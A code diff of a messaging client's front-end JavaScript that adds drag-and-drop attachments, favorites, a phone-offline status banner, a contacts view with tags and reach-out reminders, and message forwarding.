     $threadSearchInput.addEventListener('input', scheduleThreadSearch);
     $threadSearchInput.addEventListener('keydown', async (event) => {
       if (event.key === 'Enter') {
@@ -9205,6 +10763,10 @@ body::after {
 
   // ─── Attachments (paste + file picker) ───
   function setAttachment(file) {
+    if (composeSendInFlight) {
+      $fileInput.value = '';
+      return;
+    }
     if (!conversationSupportsMediaOutbound(activeConversation)) {
       showThreadFeedback('Attachments are unavailable on this route right now.');
       return;
@@ -9232,22 +10794,61 @@ body::after {
     autoResize();
   }
 
-  // Paste handler: Ctrl+V / Cmd+V with image data
-  $composeInput.addEventListener('paste', e => {
-    const items = e.clipboardData?.items;
-    if (!items) return;
+	  // Paste handler: Ctrl+V / Cmd+V with image data
+	  $composeInput.addEventListener('paste', e => {
+	    const items = e.clipboardData?.items;
+	    if (!items) return;
     for (const item of items) {
       if (item.kind === 'file' && item.type.startsWith('image/')) {
         e.preventDefault();
         const file = item.getAsFile();
         if (file) setAttachment(file);
         return;
-      }
-    }
-  });
+	      }
+	    }
+	  });
 
-  // File picker button
-  $attachBtn.addEventListener('click', () => {
+	  let composeDragDepth = 0;
+
+	  function dragEventHasFiles(event) {
+	    const types = event.dataTransfer?.types;
+	    return !!types && Array.from(types).includes('Files');
+	  }
+
+	  function setComposeDragOver(active) {
+	    if (!$composeBar) return;
+	    $composeBar.classList.toggle('drag-over', !!active);
+	  }
+
+	  if ($composeBar) {
+	    $composeBar.addEventListener('dragenter', event => {
+	      if (!dragEventHasFiles(event)) return;
+	      event.preventDefault();
+	      composeDragDepth += 1;
+	      setComposeDragOver(true);
+	    });
+	    $composeBar.addEventListener('dragover', event => {
+	      if (!dragEventHasFiles(event)) return;
+	      event.preventDefault();
+	      event.dataTransfer.dropEffect = conversationSupportsMediaOutbound(activeConversation) ? 'copy' : 'none';
+	    });
+	    $composeBar.addEventListener('dragleave', event => {
+	      if (!dragEventHasFiles(event)) return;
+	      composeDragDepth = Math.max(0, composeDragDepth - 1);
+	      if (composeDragDepth === 0) setComposeDragOver(false);
+	    });
+	    $composeBar.addEventListener('drop', event => {
+	      if (!dragEventHasFiles(event)) return;
+	      event.preventDefault();
+	      composeDragDepth = 0;
+	      setComposeDragOver(false);
+	      const file = event.dataTransfer?.files?.[0];
+	      if (file) setAttachment(file);
+	    });
+	  }
+
+	  // File picker button
+	  $attachBtn.addEventListener('click', () => {
     if (!conversationSupportsMediaOutbound(activeConversation)) {
       showThreadFeedback('Attachments are unavailable on this route right now.');
       return;
@@ -9276,11 +10877,22 @@ body::after {
       UnreadCount: result.UnreadCount || 0,
       source_platform: result.SourcePlatform || result.source_platform,
       DisplayProtocol: result.DisplayProtocol || result.display_protocol || '',
+      IsFavorite: !!(result.IsFavorite || result.is_favorite),
+      is_favorite: !!(result.IsFavorite || result.is_favorite),
       UnifiedID: result.UnifiedID || result.unified_id || '',
       UnifiedName: result.UnifiedName || result.unified_name || '',
       _searchPreview: result.preview || '',
     }));
     renderConversations(searchConvos, true);
+  }
+
+  async function renderConversationListPreservingSearch() {
+    const query = $searchInput.value.trim();
+    if (query) {
+      await renderSearchResults(query);
+      return;
+    }
+    renderConversations(allConversations);
   }
 
   $searchInput.addEventListener('input', () => {
@@ -9307,6 +10919,7 @@ body::after {
       paired: raw.paired === undefined ? !!raw.connected : !!raw.paired,
       needs_pairing: !!raw.needs_pairing,
       needs_repair: !!raw.needs_repair,
+      phone_responding: raw.phone_responding === undefined ? true : !!raw.phone_responding,
       last_error: raw.last_error || '',
     };
   }
@@ -9332,6 +10945,13 @@ body::after {
       $connectionBannerAction.textContent = 'Re-pair';
       $connectionBannerAction.dataset.action = 'open-platforms';
       $connectionBannerAction.style.display = '';
+      return;
+    }
+    if (googleStatus.connected && !googleStatus.phone_responding) {
+      $connectionBanner.className = 'connection-banner disconnected';
+      $connectionBanner.style.display = 'flex';
+      $connectionBannerCopy.textContent = 'Your phone isn’t responding to OpenMessage right now. Make sure it’s on and online, then try again.';
+      $connectionBannerAction.style.display = 'none';
       return;
     }
     if (googleStatus.connected) {
@@ -9468,6 +11088,7 @@ body::after {
   }
 
   function googleStatusText() {
+    if (googleStatus.connected && !googleStatus.phone_responding) return 'Phone offline';
     if (googleStatus.connected) return 'Connected';
     if (googleStatus.paired && !googleStatus.needs_pairing) return 'Needs reconnect';
     return 'Needs pairing';
@@ -9595,8 +11216,19 @@ body::after {
     } else if (googleStatus.last_error) {
       $gmStatusPill.classList.add('error');
     }
-    if (googleStatus.connected) {
-      $gmHelper.textContent = 'Google Messages live sync is active. New SMS and RCS messages should appear immediately. If new messages stop arriving, pair again to refresh the connection.';
+    if (googleStatus.needs_repair) {
+      $gmHelper.textContent = nativeAppBridge()
+        ? 'Google Messages needs to be paired again. Open the native pairing flow to refresh your Android phone connection.'
+        : 'Google Messages needs to be paired again. Use the button below to copy the pair command, then run it in Terminal.';
+      showGoogleError(googleStatus.last_error);
+      $gmActionsRow.style.display = '';
+      $gmReconnectBtn.disabled = false;
+      $gmReconnectBtn.textContent = 'Pair again';
+      $gmReconnectBtn.dataset.mode = 'pair';
+    } else if (googleStatus.connected) {
+      $gmHelper.textContent = googleStatus.phone_responding
+        ? 'Google Messages live sync is active. New SMS and RCS messages should appear immediately. If new messages stop arriving, pair again to refresh the connection.'
+        : 'Google Messages is connected, but your phone is not responding right now. Keep the phone on and online, then try again.';
       showGoogleError('');
       // Keep a re-pair affordance available even while "connected": the
       // connection flag can stay true after the session has silently gone
@@ -9801,6 +11433,211 @@ body::after {
     stopWhatsAppPolling();
     clearWhatsAppError();
     clearSignalError();
+  }
+
+  // ─── Contacts / CRM view ───
+  function openContacts() {
+    if (!$contactsOverlay) return;
+    $contactsOverlay.classList.add('show');
+    loadPeople('');
+    if ($contactsSearchInput) { $contactsSearchInput.value = ''; setTimeout(() => $contactsSearchInput.focus(), 80); }
+  }
+  function closeContacts() {
+    if ($contactsOverlay) $contactsOverlay.classList.remove('show');
+  }
+
+  function formatLastContacted(ts) {
+    if (!ts) return 'Never contacted';
+    const days = Math.floor((Date.now() - ts) / 86400000);
+    if (days <= 0) return 'Today';
+    if (days === 1) return 'Yesterday';
+    if (days < 30) return `${days} days ago`;
+    if (days < 365) return `${Math.floor(days / 30)} mo ago`;
+    return new Date(ts).toLocaleDateString([], { year: 'numeric', month: 'short' });
+  }
+
+  async function loadPeople(q) {
+    if (!$contactsList) return;
+    try {
+      const people = await fetchJSON(`/api/people${q ? `?q=${encodeURIComponent(q)}` : ''}`);
+      contactsPeople = Array.isArray(people) ? people : [];
+      renderContactsList(sortPeople(contactsPeople));
+    } catch (err) {
+      $contactsList.innerHTML = `<div style="padding:24px;color:var(--text-muted);font-size:13px">Failed to load contacts.</div>`;
+    }
+  }
+
+  function personHasName(p) {
+    return /[a-z]/i.test(String(p.name || ''));
+  }
+
+  // Sort the loaded people by the active mode without re-fetching.
+  function sortPeople(people) {
+    const list = people.slice();
+    if (contactsSortMode === 'alpha') {
+      // Named contacts A–Z first; "numbers only" names sorted last.
+      list.sort((a, b) => {
+        const an = personHasName(a), bn = personHasName(b);
+        if (an !== bn) return an ? -1 : 1;
+        return String(a.name || '').localeCompare(String(b.name || ''), undefined, { sensitivity: 'base' });
+      });
+    } else if (contactsSortMode === 'messages') {
+      list.sort((a, b) => (b.message_count || 0) - (a.message_count || 0) || (b.last_contacted_ts || 0) - (a.last_contacted_ts || 0));
+    } else {
+      list.sort((a, b) => (b.last_contacted_ts || 0) - (a.last_contacted_ts || 0));
+    }
+    return list;
+  }
+
+  function setContactsSort(mode) {
+    if (contactsSortMode === mode) return;
+    contactsSortMode = mode;
+    document.querySelectorAll('#contacts-sort .contacts-sort-btn').forEach(b => b.classList.toggle('active', b.dataset.sort === mode));
+    renderContactsList(sortPeople(contactsPeople));
+  }
+
+  function renderContactsList(people) {
+    if (!people.length) {
+      $contactsList.innerHTML = `<div style="padding:24px;color:var(--text-muted);font-size:13px">No contacts found.</div>`;
+      return;
+    }
+    $contactsList.innerHTML = '';
+    people.forEach(p => {
+      const el = document.createElement('div');
+      el.className = 'contact-row' + (p.key === contactsCurrentKey ? ' active' : '');
+      el.dataset.key = p.key;
+      const due = p.overdue ? '<span class="contact-row-due">Due</span>' : '';
+      el.innerHTML = `
+        ${avatarHTML({ name: p.name, numbers: p.numbers || [], className: 'convo-avatar', style: `background:${avatarColor(p.name)}` })}
+        <div class="contact-row-meta">
+          <div class="contact-row-name">${escapeHtml(p.name)}</div>
+          <div class="contact-row-sub">${escapeHtml(formatLastContacted(p.last_contacted_ts))} · ${p.message_count || 0} msg${p.message_count === 1 ? '' : 's'}</div>
+        </div>
+        ${due}
+      `;
+      el.addEventListener('click', () => selectPerson(p.key));
+      $contactsList.appendChild(el);
+    });
+    hydrateNativeAvatars($contactsList);
+  }
+
+  async function selectPerson(key) {
+    contactsCurrentKey = key;
+    $contactsList.querySelectorAll('.contact-row').forEach(r => r.classList.toggle('active', r.dataset.key === key));
+    $contactsDetailEmpty.style.display = 'none';
+    $contactsDetailBody.hidden = false;
+    $contactsDetailBody.innerHTML = `<div style="color:var(--text-muted);font-size:13px">Loading…</div>`;
+    try {
+      const p = await fetchJSON(`/api/people/${encodeURIComponent(key)}`);
+      renderPersonDetail(p);
+    } catch (err) {
+      $contactsDetailBody.innerHTML = `<div style="color:var(--text-muted)">Failed to load contact.</div>`;
+    }
+  }
+
+  function renderPersonDetail(p) {
+    const numbers = p.numbers || [];
+    const platforms = p.platforms || [];
+    const tags = p.tags || [];
+    let dueHtml = '';
+    if (p.reach_out_days > 0) {
+      dueHtml = p.overdue
+        ? `<span class="cd-due-pill overdue">Overdue</span>`
+        : `<span class="cd-due-pill ok">On track</span>`;
+    }
+    let infoRows = '';
+    if (numbers.length) infoRows += `<div class="cd-info-row"><span class="k">Phone</span><span>${numbers.map(escapeHtml).join('<br>')}</span></div>`;
+    if (platforms.length) infoRows += `<div class="cd-info-row"><span class="k">Platforms</span><span>${platforms.map(escapeHtml).join(', ')}</span></div>`;
+    infoRows += `<div class="cd-info-row"><span class="k">Last contacted</span><span>${escapeHtml(formatLastContacted(p.last_contacted_ts))}</span></div>`;
+    infoRows += `<div class="cd-info-row"><span class="k">Messages</span><span>${p.message_count || 0}</span></div>`;
+
+    const tagsHtml = tags.map((t, i) => `<span class="cd-tag">${escapeHtml(t)}<button data-tag-idx="${i}" title="Remove">&times;</button></span>`).join('');
+
+    $contactsDetailBody.innerHTML = `
+      <div class="cd-head">
+        ${avatarHTML({ name: p.name, numbers: numbers, className: 'convo-avatar', style: `background:${avatarColor(p.name)}` })}
+        <div>
+          <div class="cd-name">${escapeHtml(p.name)}</div>
+          <div class="cd-sub">${escapeHtml(formatLastContacted(p.last_contacted_ts))} · ${p.message_count || 0} messages</div>
+        </div>
+      </div>
+      ${(p.conversation_ids && p.conversation_ids.length) ? `<div class="cd-section"><button class="cd-btn primary" id="cd-open-convo">Open conversation${p.conversation_ids.length > 1 ? 's' : ''}</button></div>` : ''}
+      <div class="cd-section">
+        <div class="cd-label">Contact information</div>
+        ${infoRows}
+      </div>
+      <div class="cd-section">
+        <div class="cd-label">Tags</div>
+        <div class="cd-tags" id="cd-tags">
+          ${tagsHtml}
+          <input type="text" class="cd-tag-input" id="cd-tag-input" placeholder="Add tag…" autocomplete="off">
+        </div>
+      </div>
+      <div class="cd-section">
+        <div class="cd-label">Reach-out reminder ${dueHtml}</div>
+        <div class="cd-tickler">
+          <span class="muted">Remind me to reach out every</span>
+          <input type="number" id="cd-reachout-input" min="0" max="3650" value="${p.reach_out_days || ''}" placeholder="0">
+          <span class="muted">days</span>
+          <button class="cd-btn primary" id="cd-reachout-save">Save</button>
+        </div>
+      </div>
+      <div class="cd-section">
+        <div class="cd-label">Relationship summary</div>
+        <div class="cd-summary" id="cd-summary">${escapeHtml(p.summary || 'No summary yet.')}</div>
+        <div style="margin-top:12px"><button class="cd-btn" id="cd-summary-regen">Regenerate</button></div>
+      </div>
+    `;
+    wirePersonDetail(p);
+  }
+
+  async function openPersonConversation(p) {
+    const ids = (p && p.conversation_ids) || [];
+    if (!ids.length) return;
+    closeContacts();
+    let convo = null;
+    for (const id of ids) { // ids are most-recent-first
+      convo = allConversations.find(c => c.ConversationID === id);
+      if (convo) break;
+    }
+    if (!convo) {
+      // Not in the loaded set yet — reload conversations, then try again.
+      await loadConversations();
+      convo = allConversations.find(c => ids.includes(c.ConversationID)) || null;
+    }
+    if (convo) await revealAndSelectConversation(convo);
+  }
+
+  function wirePersonDetail(p) {
+    const key = p.key;
+    const tags = (p.tags || []).slice();
+    const openBtn = document.getElementById('cd-open-convo');
+    if (openBtn) openBtn.addEventListener('click', () => openPersonConversation(p));
+    const refresh = () => { selectPerson(key); loadPeople($contactsSearchInput.value.trim()); };
+    const saveTags = async (next) => {
+      try { await postJSON(`/api/people/${encodeURIComponent(key)}/tags`, { tags: next }); refresh(); }
+      catch (err) { showThreadFeedback(err.message || 'Failed to save tags.'); }
+    };
+    const tagInput = document.getElementById('cd-tag-input');
+    if (tagInput) tagInput.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') { e.preventDefault(); const v = tagInput.value.trim(); if (v) saveTags([...tags, v]); }
+    });
+    document.querySelectorAll('#cd-tags .cd-tag button').forEach(btn => {
+      btn.addEventListener('click', () => { const idx = parseInt(btn.dataset.tagIdx, 10); saveTags(tags.filter((_, i) => i !== idx)); });
+    });
+    const reachSave = document.getElementById('cd-reachout-save');
+    if (reachSave) reachSave.addEventListener('click', async () => {
+      const days = parseInt(document.getElementById('cd-reachout-input').value, 10) || 0;
+      try { await postJSON(`/api/people/${encodeURIComponent(key)}/reach-out`, { days }); refresh(); }
+      catch (err) { showThreadFeedback(err.message || 'Failed to save reminder.'); }
+    });
+    const regen = document.getElementById('cd-summary-regen');
+    if (regen) regen.addEventListener('click', async () => {
+      regen.disabled = true; regen.textContent = 'Generating…';
+      try { const updated = await postJSON(`/api/people/${encodeURIComponent(key)}/summary`, {}); document.getElementById('cd-summary').textContent = updated.summary || 'No summary.'; }
+      catch (err) { showThreadFeedback(err.message || 'Failed to generate summary.'); }
+      finally { regen.disabled = false; regen.textContent = 'Regenerate'; }
+    });
   }
 
   async function connectWhatsAppBridge() {
@@ -10156,10 +11993,11 @@ body::after {
   }
 
   // ─── Reactions ───
-  window.sendReaction = async function(messageId, emoji) {
-    // Close pickers
-    document.querySelectorAll('.emoji-picker.show').forEach(p => p.classList.remove('show'));
-    document.querySelectorAll('.emoji-full-panel.show').forEach(p => p.classList.remove('show'));
+	  window.sendReaction = async function(messageId, emoji) {
+	    // Close pickers
+	    document.querySelectorAll('.emoji-picker.show').forEach(p => p.classList.remove('show'));
+	    document.querySelectorAll('.emoji-full-panel.show').forEach(p => p.classList.remove('show'));
+	    closeComposeGifPanel();
     try {
       await postJSON('/api/react', {
         message_id: messageId,
@@ -10234,12 +12072,13 @@ body::after {
   };
 
   // Close react picker and full panel when clicking elsewhere
-  document.addEventListener('click', (e) => {
-    if (!e.target.closest('.emoji-picker') && !e.target.closest('.emoji-full-panel') && !e.target.closest('.msg-actions') && !e.target.closest('#compose-emoji-btn')) {
-      document.querySelectorAll('.emoji-picker.show').forEach(p => p.classList.remove('show'));
-      document.querySelectorAll('.emoji-full-panel.show').forEach(p => p.classList.remove('show'));
-      if ($composeEmojiBtn) $composeEmojiBtn.setAttribute('aria-expanded', 'false');
-    }
+	  document.addEventListener('click', (e) => {
+	    if (!e.target.closest('.emoji-picker') && !e.target.closest('.emoji-full-panel') && !e.target.closest('.gif-compose-panel') && !e.target.closest('.msg-actions') && !e.target.closest('#compose-emoji-btn') && !e.target.closest('#compose-gif-btn')) {
+	      document.querySelectorAll('.emoji-picker.show').forEach(p => p.classList.remove('show'));
+	      document.querySelectorAll('.emoji-full-panel.show').forEach(p => p.classList.remove('show'));
+	      if ($composeEmojiBtn) $composeEmojiBtn.setAttribute('aria-expanded', 'false');
+	      closeComposeGifPanel();
+	    }
     if ($threadSearchResults && !$threadSearchResults.hidden && !e.target.closest('.thread-search')) {
       clearThreadSearchResults();
     }
@@ -10266,6 +12105,12 @@ body::after {
           }
           if (action === 'leave-whatsapp-group') {
             await leaveWhatsAppGroup(context.conversation);
+            return;
+          }
+          if (action === 'toggle-favorite') {
+            const willFavorite = !conversationFavoriteOf(context.conversation);
+            await setConversationFavorite(context.conversation, willFavorite);
+            showThreadFeedback(willFavorite ? 'Added to favorites.' : 'Removed from favorites.');
             return;
           }
           if (action === 'copy-number') {
@@ -10307,6 +12152,10 @@ body::after {
             setReplyTo(message);
             return;
           }
+          if (action === 'forward-message') {
+            openForwardDialog(message);
+            return;
+          }
           if (action === 'copy-message') {
             await copyTextToClipboard(message.Body || '');
             showThreadFeedback('Message copied.');
@@ -10334,6 +12183,22 @@ body::after {
   window.addEventListener('blur', closeContextMenu);
   window.addEventListener('resize', closeContextMenu);
 
+  if ($forwardClose) {
+    $forwardClose.addEventListener('click', () => {
+      if (!forwarding) closeForwardDialog();
+    });
+  }
+  if ($forwardOverlay) {
+    $forwardOverlay.addEventListener('click', (event) => {
+      if (event.target === $forwardOverlay && !forwarding) {
+        closeForwardDialog();
+      }
+    });
+  }
+  if ($forwardSearch) {
+    $forwardSearch.addEventListener('input', renderForwardTargets);
+  }
+
   // ─── Reply ───
   function setReplyTo(msg) {
     if (!conversationSupportsOutbound(activeConversation)) {
@@ -10352,12 +12217,13 @@ body::after {
     $replyIndicator.classList.remove('show');
   }
 
-  function clearTransientComposerState() {
-    clearReply();
-    if (pendingFile) {
-      clearAttachment();
-    }
-  }
+	  function clearTransientComposerState() {
+	    clearReply();
+	    if (pendingFile) {
+	      clearAttachment();
+	    }
+	    closeComposeGifPanel();
+	  }
 
   $replyClose.addEventListener('click', clearReply);
 
@@ -10486,9 +12352,15 @@ body::after {
       e.preventDefault();
       // Close the context menu if open
       if ($contextMenu && !$contextMenu.hidden) { closeContextMenu(); return; }
+      // Close the forward dialog if open
+      if ($forwardOverlay && !$forwardOverlay.hidden) {
+        if (!forwarding) closeForwardDialog();
+        return;
+      }
       // Close fullscreen image viewer if open
       const fullscreen = document.querySelector('.msg-image-fullscreen');
       if (fullscreen) { fullscreen.remove(); return; }
+      if ($composeGifPanel && $composeGifPanel.classList.contains('show')) { closeComposeGifPanel(); return; }
       // Close any open emoji pickers or full panels
       const openPanels = document.querySelectorAll('.emoji-full-panel.show');
       if (openPanels.length) {
@@ -10941,6 +12813,18 @@ body::after {
     const v = $scheduleCustomInput && $scheduleCustomInput.value;
     if (!v) { showThreadFeedback('Pick a date and time.'); return; }
     scheduleSend(new Date(v).getTime());
+  });
+  if ($contactsBtn) $contactsBtn.addEventListener('click', openContacts);
+  if ($contactsClose) $contactsClose.addEventListener('click', closeContacts);
+  if ($contactsSearchInput) $contactsSearchInput.addEventListener('input', () => {
+    clearTimeout(contactsSearchTimer);
+    contactsSearchTimer = setTimeout(() => loadPeople($contactsSearchInput.value.trim()), 200);
+  });
+  document.querySelectorAll('#contacts-sort .contacts-sort-btn').forEach(btn => {
+    btn.addEventListener('click', () => setContactsSort(btn.dataset.sort));
+  });
+  window.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape' && $contactsOverlay && $contactsOverlay.classList.contains('show')) closeContacts();
   });
   startEventStream();
   loadTabs();
